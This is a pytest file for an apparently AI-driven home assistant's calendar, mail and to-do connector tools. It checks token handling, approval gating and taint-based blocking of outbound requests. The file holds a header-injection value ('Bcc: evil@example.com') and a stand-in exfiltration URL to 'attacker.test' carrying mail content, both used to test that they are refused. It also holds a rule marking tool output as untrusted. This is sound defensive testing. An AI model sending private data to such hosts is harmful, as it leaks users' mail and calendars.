"""adk.home.connector_tools: the Hearth calendar / mail / to-do tools.

Every provider and the Genesis resolve endpoint sit behind one
``httpx.MockTransport`` (patched into ``httpx.AsyncClient``), so the requests
below are the ones that would have left the box -- including the one that
resolves the token with the owner's sign-in bearer.
"""

from __future__ import annotations

import base64
import json
import logging
from datetime import date, datetime, timezone
from email import message_from_bytes

import httpx
import pytest

from adk import approval
from adk.home import connector_tools as ct
from adk.home import hearth, serve
from adk.home.life_tools import ALWAYS_ASK, FollowupStore
from adk.tools import ToolRegistry

TOKEN = "ya29.SECRET-ACCESS-TOKEN-never-shown-0123456789"
BEARER = "aither-signin-bearer-abc"
RESOLVE_BASE = "https://genesis.test"


class FakeCloud:
    """Genesis /connectors/resolve + the Google and Graph endpoints the tools use."""

    def __init__(self, connected=("google_calendar", "gmail")):
        self.connected = set(connected)
        self.requests: list[httpx.Request] = []
        self.resolve_bodies: list[dict] = []
        self.google_events: list[dict] = []
        self.graph_events: list[dict] = []
        self.status_override: dict[str, int] = {}

    def handler(self, request: httpx.Request) -> httpx.Response:
        self.requests.append(request)
        url = str(request.url)
        for fragment, status in self.status_override.items():
            if fragment in url:
                return httpx.Response(status, json={"error": {"message": "nope"}})
        if url.startswith(RESOLVE_BASE):
            assert request.headers["authorization"] == f"Bearer {BEARER}"
            body = json.loads(request.content or b"{}")
            self.resolve_bodies.append(body)
            wanted = body.get("connectors") or sorted(self.connected)
            env = {f"CONNECTOR_{c.upper()}_TOKEN": TOKEN for c in wanted
                   if c in self.connected}
            return httpx.Response(200, json={"success": True, "env": env})
        assert request.headers.get("authorization") == f"Bearer {TOKEN}"
        if url.startswith(ct.GOOGLE_CAL):
            if request.method == "POST":
                return httpx.Response(200, json={"id": "gev1"})
            return httpx.Response(200, json={"items": self.google_events})
        if url.startswith(f"{ct.GRAPH}/me/calendarView"):
            return httpx.Response(200, json={"value": self.graph_events})
        if url.startswith(f"{ct.GRAPH}/me/events"):
            return httpx.Response(201, json={"id": "msev1"})
        if url.startswith(f"{ct.GMAIL}/messages/send"):
            return httpx.Response(200, json={"id": "gm-sent-1"})
        if url.startswith(f"{ct.GMAIL}/messages/m1"):
            return httpx.Response(200, json={"snippet": "Lunch at noon?", "payload": {
                "headers": [{"name": "From", "value": "Ann <ann@example.com>"},
                            {"name": "Subject", "value": "Lunch"},
                            {"name": "Date", "value": "Tue, 29 Sep 2026 09:00:00 +0000"}]}})
        if url.startswith(f"{ct.GMAIL}/messages"):
            return httpx.Response(200, json={"messages": [{"id": "m1"}],
                                             "resultSizeEstimate": 1})
        if url.startswith(f"{ct.GRAPH}/me/sendMail"):
            return httpx.Response(202)
        if url.startswith(f"{ct.GRAPH}/me/mailFolders/inbox/messages"):
            return httpx.Response(200, json={"value": [{
                "subject": "Invoice", "receivedDateTime": "2026-09-29T08:00:00Z",
                "bodyPreview": "Attached", "from": {"emailAddress": {
                    "name": "Bob", "address": "bob@example.com"}}}]})
        if url.startswith(f"{ct.GRAPH}/me/todo/lists/L1/tasks"):
            if request.method == "POST":
                return httpx.Response(201, json={"id": "t9"})
            return httpx.Response(200, json={"value": [
                {"id": "t1", "title": "Buy milk", "dueDateTime": {
                    "dateTime": "2026-10-01T00:00:00.0000000", "timeZone": "UTC"}}]})
        if url.startswith(f"{ct.GRAPH}/me/todo/lists"):
            return httpx.Response(200, json={"value": [
                {"id": "L0", "displayName": "Groceries"},
                {"id": "L1", "wellknownListName": "defaultList"}]})
        return httpx.Response(404, json={"error": {"message": f"no route {url}"}})


@pytest.fixture
def cloud(monkeypatch):
    fake = FakeCloud()
    real = httpx.AsyncClient

    def _client(*args, **kwargs):
        kwargs.pop("verify", None)
        kwargs["transport"] = httpx.MockTransport(fake.handler)
        return real(*args, **kwargs)

    monkeypatch.setattr(httpx, "AsyncClient", _client)
    monkeypatch.setattr(ct, "_saved_bearer", lambda: BEARER)
    monkeypatch.setenv("AITHER_CONNECTORS_URL", RESOLVE_BASE)
    for name in ("google_calendar", "gmail", "microsoft_graph"):
        monkeypatch.delenv(f"CONNECTOR_{name.upper()}_TOKEN", raising=False)
    return fake


def _tools(resolver=None):
    return {fn.__name__: fn for fn in ct.build_connector_tools(resolver)}


# ── not connected / not signed in ───────────────────────────────────────────────

@pytest.mark.asyncio
async def test_not_connected_says_where_to_connect(cloud):
    cloud.connected = set()
    out = json.loads(await _tools()["calendar_agenda"]("today"))
    assert "error" in out
    assert "not connected" in out["error"] or "no calendar is connected" in out["error"]
    assert ct.connect_url() in out["error"]
    assert cloud.resolve_bodies == [{"connectors": ["google_calendar", "microsoft_graph"]}]


@pytest.mark.asyncio
async def test_the_connect_url_is_admin_only_so_every_message_says_an_admin_connects(
        cloud, monkeypatch):
    """The only connect page is /admin (no member route hosts the OAuth start yet):
    a buyer told "connect it at <admin url>" is bounced to ?denied=veil:admin."""
    assert "/admin" in ct.DEFAULT_CONNECT_URL
    cloud.connected = set()
    out = json.loads(await _tools()["calendar_agenda"]("today"))
    assert "workspace admin" in out["error"]
    cloud.status_override = {ct.GOOGLE_CAL: 401}
    cloud.connected = {"google_calendar"}
    out = json.loads(await _tools(ct.TokenResolver())["calendar_agenda"]("today"))
    assert "workspace admin" in out["error"]
    monkeypatch.setattr(ct, "_saved_bearer", lambda: "")
    for name in ("AITHER_API_KEY", "AITHER_IDENTITY_BEARER", "AITHER_SESSION_BEARER"):
        monkeypatch.delenv(name, raising=False)
    out = json.loads(await _tools()["mail_unread"](3))
    assert "workspace admin" in out["error"]


@pytest.mark.asyncio
async def test_todo_with_only_google_points_at_microsoft(cloud):
    out = json.loads(await _tools()["todo_list"]())
    assert "Microsoft 365" in out["error"] and ct.connect_url() in out["error"]


@pytest.mark.asyncio
async def test_unsigned_home_is_told_to_sign_in(cloud, monkeypatch):
    monkeypatch.setattr(ct, "_saved_bearer", lambda: "")
    for name in ("AITHER_API_KEY", "AITHER_IDENTITY_BEARER", "AITHER_SESSION_BEARER"):
        monkeypatch.delenv(name, raising=False)
    out = json.loads(await _tools()["mail_unread"](3))
    assert "adk home signin" in out["error"] and ct.connect_url() in out["error"]
    assert cloud.requests == []                      # nothing left the box


@pytest.mark.asyncio
async def test_unreachable_resolver_is_not_reported_as_not_connected(cloud, monkeypatch):
    async def _down(*a, **k):
        return {"env": {}, "error": "unreachable"}

    monkeypatch.setattr("adk.connectors.resolve_connectors", _down)
    out = json.loads(await _tools()["calendar_agenda"]("today"))
    assert "could not reach the connector service" in out["error"]


# ── agenda parsing ─────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_agenda_parses_google_events(cloud):
    cloud.google_events = [
        {"summary": "Standup", "start": {"dateTime": "2026-09-29T09:00:00Z"},
         "end": {"dateTime": "2026-09-29T09:15:00Z"}, "location": "Zoom"},
        {"summary": "Holiday", "start": {"date": "2026-09-29"}, "end": {"date": "2026-09-30"}},
    ]
    out = json.loads(await _tools()["calendar_agenda"]("2026-09-29"))
    assert out["source"] == "google_calendar" and out["day"] == "2026-09-29"
    assert out["count"] == 2
    first = out["events"][0]
    local = datetime(2026, 9, 29, 9, 0, tzinfo=timezone.utc).astimezone().strftime("%H:%M")
    assert first == {"start": local, "end": first["end"], "title": "Standup",
                     "location": "Zoom"}
    assert out["events"][1]["start"] == "all day"
    req = next(r for r in cloud.requests if str(r.url).startswith(ct.GOOGLE_CAL))
    assert req.url.params["singleEvents"] == "true"
    assert req.url.params["timeMin"].startswith("2026-09-29T00:00:00")


@pytest.mark.asyncio
async def test_agenda_parses_graph_events(cloud):
    cloud.connected = {"microsoft_graph"}
    cloud.graph_events = [
        {"subject": "1:1", "isAllDay": False,
         "start": {"dateTime": "2026-09-29T15:30:00.0000000", "timeZone": "UTC"},
         "end": {"dateTime": "2026-09-29T16:00:00.0000000", "timeZone": "UTC"},
         "location": {"displayName": "Room 4"}},
        {"subject": "Offsite", "isAllDay": True, "start": {}, "end": {}},
    ]
    out = json.loads(await _tools()["calendar_agenda"]("2026-09-29"))
    assert out["source"] == "microsoft_graph" and out["count"] == 2
    local = datetime(2026, 9, 29, 15, 30, tzinfo=timezone.utc).astimezone().strftime("%H:%M")
    assert out["events"][0]["start"] == local
    assert out["events"][0]["location"] == "Room 4"
    assert out["events"][1]["start"] == "all day"
    req = next(r for r in cloud.requests if "calendarView" in str(r.url))
    assert req.headers["prefer"] == 'outlook.timezone="UTC"'
    assert req.url.params["startDateTime"].endswith("Z")


def test_parse_day_reads_words_weekdays_and_dates():
    tue = date(2026, 9, 29)  # a Tuesday
    assert ct.parse_day("today", tue) == tue
    assert ct.parse_day("tomorrow", tue) == date(2026, 9, 30)
    assert ct.parse_day("friday", tue) == date(2026, 10, 2)
    assert ct.parse_day("tuesday", tue) == tue
    assert ct.parse_day("next tuesday", tue) == date(2026, 10, 6)
    assert ct.parse_day("2026-12-25", tue) == date(2026, 12, 25)
    with pytest.raises(ValueError):
        ct.parse_day("someday", tue)


# ── the actions ──────────────────────────────────────────────────────────────────

@pytest.mark.asyncio
async def test_mail_send_builds_a_gmail_message_without_header_injection(cloud):
    out = json.loads(await _tools()["mail_send"]("ann@example.com",
                                                 "Hi\nBcc: evil@example.com", "See you"))
    assert out["ok"] and out["via"] == "gmail"
    req = next(r for r in cloud.requests if str(r.url).endswith("/messages/send"))
    raw = json.loads(req.content)["raw"]
    msg = message_from_bytes(base64.urlsafe_b64decode(raw))
    assert msg["To"] == "ann@example.com" and msg["Bcc"] is None
    assert msg["Subject"] == "Hi Bcc: evil@example.com"


@pytest.mark.asyncio
async def test_mail_send_refuses_a_non_address(cloud):
    out = json.loads(await _tools()["mail_send"]("ann@example.com\nBcc: x@y.z", "s", "b"))
    assert "error" in out
    assert not [r for r in cloud.requests if "send" in str(r.url)]


@pytest.mark.asyncio
async def test_graph_mail_todo_and_event(cloud):
    cloud.connected = {"microsoft_graph"}
    tools = _tools()
    unread = json.loads(await tools["mail_unread"](2))
    assert unread["messages"][0]["from"] == "Bob <bob@example.com>"
    sent = json.loads(await tools["mail_send"]("bob@example.com", "Re: Invoice", "Paid"))
    assert sent["ok"] and sent["via"] == "microsoft_graph"
    todos = json.loads(await tools["todo_list"]())
    assert todos["items"] == [{"id": "t1", "title": "Buy milk", "due": "2026-10-01"}]
    added = json.loads(await tools["todo_add"]("Call mum"))
    assert added["ok"] and added["id"] == "t9"
    event = json.loads(await tools["calendar_add"]("tomorrow 9:00", "Dentist", 45))
    assert event["ok"] and event["calendar"] == "microsoft_graph" and event["minutes"] == 45
    post = next(r for r in cloud.requests if str(r.url) == f"{ct.GRAPH}/me/events")
    assert json.loads(post.content)["start"]["timeZone"] == "UTC"


@pytest.mark.asyncio
async def test_gmail_unread_reads_headers(cloud):
    out = json.loads(await _tools()["mail_unread"](5))
    assert out["messages"] == [{"from": "Ann <ann@example.com>", "subject": "Lunch",
                                "date": "Tue, 29 Sep 2026 09:00:00 +0000",
                                "preview": "Lunch at noon?"}]


@pytest.mark.asyncio
async def test_token_is_resolved_once_then_cached(cloud):
    tools = _tools(ct.TokenResolver())
    await tools["calendar_agenda"]("today")
    await tools["calendar_agenda"]("tomorrow")
    assert len(cloud.resolve_bodies) == 1


@pytest.mark.asyncio
async def test_a_401_drops_the_cached_token_and_says_reconnect(cloud):
    resolver = ct.TokenResolver()
    tools = _tools(resolver)
    cloud.status_override = {ct.GOOGLE_CAL: 401}
    out = json.loads(await tools["calendar_agenda"]("today"))
    assert "reconnect" in out["error"] and ct.connect_url() in out["error"]
    assert resolver._cached("google_calendar") == ""


# ── policy: ask-first, read-only, registration ──────────────────────────────────

def test_send_and_add_always_ask(monkeypatch):
    assert {"calendar_add", "mail_send"} <= set(ALWAYS_ASK)
    monkeypatch.setenv("AITHER_TOOL_APPROVAL", "")
    serve.apply_approval_policy()
    assert approval.needs_approval("any", "mail_send")
    assert approval.needs_approval("any", "calendar_add")
    assert not approval.needs_approval("any", "calendar_agenda")


def test_only_the_readers_are_read_only():
    assert set(ct.READ_ONLY_CONNECTOR_TOOLS) <= hearth.READ_ONLY_TOOLS
    for acting in ("calendar_add", "mail_send", "todo_add"):
        assert acting not in hearth.READ_ONLY_TOOLS
    assert set(ct.CONNECTOR_TOOL_NAMES) == {fn.__name__ for fn in ct.build_connector_tools()}


class _Agent:
    name = "hearth-test"

    def __init__(self):
        self._tools = ToolRegistry()


def test_connected_accounts_join_only_on_a_signed_in_home(tmp_path, monkeypatch):
    """Every home registers the calendar / mail / to-do tool NAMES (the built-in
    calendar needs no sign-in, adk.home.home_tools); only a signed-in home's tools
    resolve an OAuth account."""
    from adk.home import home_tools

    monkeypatch.delenv("ADK_BUILTIN_TOOL_CATEGORIES", raising=False)
    monkeypatch.delenv("AITHER_TOOL_PACKS", raising=False)
    monkeypatch.delenv("ADK_APP_PROXY_URL", raising=False)
    store = FollowupStore(tmp_path / "f.json")
    remote: list[bool] = []
    real = home_tools.build_home_tools

    def _spy(planner=None, **kw):
        remote.append(bool(kw.get("remote")))
        return real(planner, **kw)

    monkeypatch.setattr(serve, "build_home_tools", _spy)

    monkeypatch.setattr(ct, "_saved_bearer", lambda: "")
    names = serve.register_serve_tools(_Agent(), store, planner_root=tmp_path)
    assert set(ct.CONNECTOR_TOOL_NAMES) <= set(names) and remote[-1] is False

    monkeypatch.setattr(ct, "_saved_bearer", lambda: BEARER)
    names = serve.register_serve_tools(_Agent(), store, planner_root=tmp_path)
    assert set(ct.CONNECTOR_TOOL_NAMES) <= set(names) and remote[-1] is True

    serve.register_serve_tools(_Agent(), store, connectors=False, planner_root=tmp_path)
    assert remote[-1] is False


# ── the token never reaches a receipt or a log ────────────────────────────────────

@pytest.mark.asyncio
async def test_token_never_in_receipts_or_logs(cloud, tmp_path, monkeypatch, caplog):
    pytest.importorskip("cryptography")
    from adk import receipts

    monkeypatch.setenv("AITHER_TOOL_APPROVAL", "")      # run the actions unprompted here
    monkeypatch.delenv(receipts.KEY_ENV, raising=False)
    monkeypatch.setattr(receipts, "_home_dir", lambda: tmp_path)
    monkeypatch.setattr(receipts, "_awseal_private_key", lambda: None)
    caplog.set_level(logging.DEBUG)

    agent = _Agent()
    for fn in ct.build_connector_tools():
        agent._tools.register(fn)
    log = tmp_path / "actions.jsonl"
    hearth.HearthCore(agent, FollowupStore(tmp_path / "f.json"), log)

    results = [
        await agent._tools.execute("calendar_agenda", {"day": "today"}),
        await agent._tools.execute("calendar_add", {"when": "tomorrow 9:00",
                                                    "title": "Dentist"}),
        await agent._tools.execute("mail_unread", {"n": 2}),
        await agent._tools.execute("mail_send", {"to": "ann@example.com",
                                                 "subject": "hi", "body": "there"}),
    ]
    cloud.status_override = {ct.GMAIL: 500}
    results.append(await agent._tools.execute("mail_unread", {"n": 1}))
    cloud.status_override = {ct.GOOGLE_CAL: 401}
    # other args than the first agenda call: HearthCore replays an identical call
    results.append(await agent._tools.execute("calendar_agenda", {"day": "tomorrow"}))

    tool_rows = [r for r in receipts.tail(20, path=log) if r["kind"] == "tool"]
    assert log.is_file() and len(tool_rows) == len(results)
    blob = log.read_text(encoding="utf-8") + "\n".join(results) + caplog.text
    assert TOKEN not in blob
    assert BEARER not in blob
    assert "answered HTTP 500" in results[4] and "reconnect" in results[5]


# ── review fixes: gate todo_add, egress after a private read, env-token 401 ───────

def test_every_acting_connector_tool_always_asks():
    acting = set(ct.CONNECTOR_TOOL_NAMES) - set(ct.READ_ONLY_CONNECTOR_TOOLS)
    assert acting == {"calendar_add", "mail_send", "todo_add"}
    assert acting <= set(ALWAYS_ASK)


def test_private_read_tools_match_the_connector_readers():
    assert hearth.PRIVATE_READ_TOOLS == frozenset(ct.READ_ONLY_CONNECTOR_TOOLS)


@pytest.mark.asyncio
async def test_read_results_are_marked_untrusted(cloud):
    cloud.connected = {"google_calendar", "gmail", "microsoft_graph"}
    tools = _tools(ct.TokenResolver())
    for name, args in (("calendar_agenda", ("today",)), ("mail_unread", (1,)),
                       ("todo_list", ())):
        out = json.loads(await tools[name](*args))
        assert out.get("untrusted") == ct.UNTRUSTED_NOTE, name
    assert "never instructions" in ct.CONNECTOR_PROMPT
    assert "todo_add" in ct.CONNECTOR_PROMPT


@pytest.mark.asyncio
async def test_web_egress_is_refused_after_a_private_read_until_cleared(cloud, tmp_path,
                                                                      monkeypatch):
    pytest.importorskip("cryptography")
    from adk import receipts

    monkeypatch.setenv("AITHER_TOOL_APPROVAL", "")
    monkeypatch.delenv(receipts.KEY_ENV, raising=False)
    monkeypatch.setattr(receipts, "_home_dir", lambda: tmp_path)
    monkeypatch.setattr(receipts, "_awseal_private_key", lambda: None)
    fetched: list = []

    async def web_fetch(url: str) -> str:
        """Fetch a page."""
        fetched.append(url)
        return json.dumps({"ok": True})

    agent = _Agent()
    agent._tools.register(web_fetch)
    for fn in ct.build_connector_tools(ct.TokenResolver()):
        agent._tools.register(fn)
    core = hearth.HearthCore(agent, FollowupStore(tmp_path / "f.json"),
                             tmp_path / "actions.jsonl")

    await agent._tools.execute("web_fetch", {"url": "https://example.com/a"})
    assert fetched == ["https://example.com/a"]
    assert core.tainted                      # web text is third-party text too
    core.clear_taint()

    await agent._tools.execute("mail_unread", {"n": 1})
    out = json.loads(await agent._tools.execute(
        "web_fetch", {"url": "https://attacker.test/?d=Lunch"}))
    assert "refused" in out["error"]
    assert fetched == ["https://example.com/a"]

    core._reset_turn_state()                 # the owner's next message: STILL tainted
    out = json.loads(await agent._tools.execute(
        "web_fetch", {"url": "https://example.com/b"}))
    assert "refused" in out["error"] and fetched == ["https://example.com/a"]

    core.clear_taint()                       # the owner's `clear taint`
    await agent._tools.execute("web_fetch", {"url": "https://example.com/b"})
    assert fetched[-1] == "https://example.com/b"


@pytest.mark.asyncio
async def test_a_failed_private_read_does_not_close_egress(cloud, tmp_path, monkeypatch):
    pytest.importorskip("cryptography")
    from adk import receipts

    monkeypatch.setenv("AITHER_TOOL_APPROVAL", "")
    monkeypatch.delenv(receipts.KEY_ENV, raising=False)
    monkeypatch.setattr(receipts, "_home_dir", lambda: tmp_path)
    monkeypatch.setattr(receipts, "_awseal_private_key", lambda: None)
    fetched: list = []

    async def web_search(query: str) -> str:
        """Search the web."""
        fetched.append(query)
        return json.dumps({"ok": True})

    agent = _Agent()
    agent._tools.register(web_search)
    for fn in ct.build_connector_tools(ct.TokenResolver()):
        agent._tools.register(fn)
    hearth.HearthCore(agent, FollowupStore(tmp_path / "f.json"), tmp_path / "a.jsonl")
    await agent._tools.execute("todo_list", {})        # only Google connected: an error
    await agent._tools.execute("web_search", {"query": "weather"})
    assert fetched == ["weather"]


@pytest.mark.asyncio
async def test_a_rejected_env_token_falls_through_to_resolve(cloud, monkeypatch):
    monkeypatch.setenv("CONNECTOR_GOOGLE_CALENDAR_TOKEN", "ya29.EXPIRED")
    inner = cloud.handler
    seen: list = []

    def handler(request: httpx.Request) -> httpx.Response:
        auth = request.headers.get("authorization", "")
        if str(request.url).startswith(ct.GOOGLE_CAL):
            seen.append(auth)
            if auth == "Bearer ya29.EXPIRED":
                return httpx.Response(401, json={"error": {"message": "expired"}})
        return inner(request)

    cloud.handler = handler
    resolver = ct.TokenResolver()
    tools = _tools(resolver)
    first = json.loads(await tools["calendar_agenda"]("today"))
    assert "reconnect" in first["error"] and cloud.resolve_bodies == []
    second = json.loads(await tools["calendar_agenda"]("tomorrow"))
    assert "error" not in second and second["source"] == "google_calendar"
    assert cloud.resolve_bodies == [{"connectors": ["google_calendar", "microsoft_graph"]}]
    assert seen == ["Bearer ya29.EXPIRED", f"Bearer {TOKEN}"]
    # a NEW env token (the harness re-injected one) is tried again
    monkeypatch.setenv("CONNECTOR_GOOGLE_CALENDAR_TOKEN", "ya29.FRESH")
    assert resolver._env_token("google_calendar") == "ya29.FRESH"


# ── resolve-all never carries a personal connector's token ────────────────────────

def test_resolve_all_strips_personal_tokens_named_resolve_keeps_them():
    from adk import connectors as adk_connectors

    payload = {"CONNECTOR_GITHUB_TOKEN": "g", "CONNECTOR_GMAIL_TOKEN": "m",
               "CONNECTOR_GOOGLE_CALENDAR_TOKEN": "c",
               "CONNECTOR_MICROSOFT_GRAPH_TOKEN": "ms", "PATH": "x"}
    assert adk_connectors._clean_env(payload) == {"CONNECTOR_GITHUB_TOKEN": "g"}
    named = adk_connectors._clean_env(payload, named=True)
    assert set(named) == {"CONNECTOR_GITHUB_TOKEN", "CONNECTOR_GMAIL_TOKEN",
                          "CONNECTOR_GOOGLE_CALENDAR_TOKEN",
                          "CONNECTOR_MICROSOFT_GRAPH_TOKEN"}


def test_sync_resolve_all_never_hands_a_child_mail_access(monkeypatch):
    from adk import connectors as adk_connectors

    bodies: list = []

    def handler(request: httpx.Request) -> httpx.Response:
        bodies.append(json.loads(request.content or b"{}"))
        return httpx.Response(200, json={"env": {
            "CONNECTOR_GITHUB_TOKEN": "g", "CONNECTOR_GMAIL_TOKEN": "m",
            "CONNECTOR_MICROSOFT_GRAPH_TOKEN": "ms"}})

    real = httpx.Client

    def _client(*args, **kwargs):
        kwargs.pop("verify", None)
        kwargs["transport"] = httpx.MockTransport(handler)
        return real(*args, **kwargs)

    monkeypatch.setattr(httpx, "Client", _client)
    monkeypatch.setenv("AITHER_GENESIS_URL", RESOLVE_BASE)
    assert adk_connectors.resolve_connector_env_sync() == {"CONNECTOR_GITHUB_TOKEN": "g"}
    assert bodies == [{}]


@pytest.mark.asyncio
async def test_async_named_resolve_returns_personal_tokens(cloud):
    from adk import connectors as adk_connectors

    named = await adk_connectors.resolve_connectors(
        ["gmail"], genesis_base=RESOLVE_BASE, bearer=BEARER)
    assert named == {"env": {"CONNECTOR_GMAIL_TOKEN": TOKEN}, "error": ""}
    everything = await adk_connectors.resolve_connectors(
        None, genesis_base=RESOLVE_BASE, bearer=BEARER)
    assert everything == {"env": {}, "error": ""}
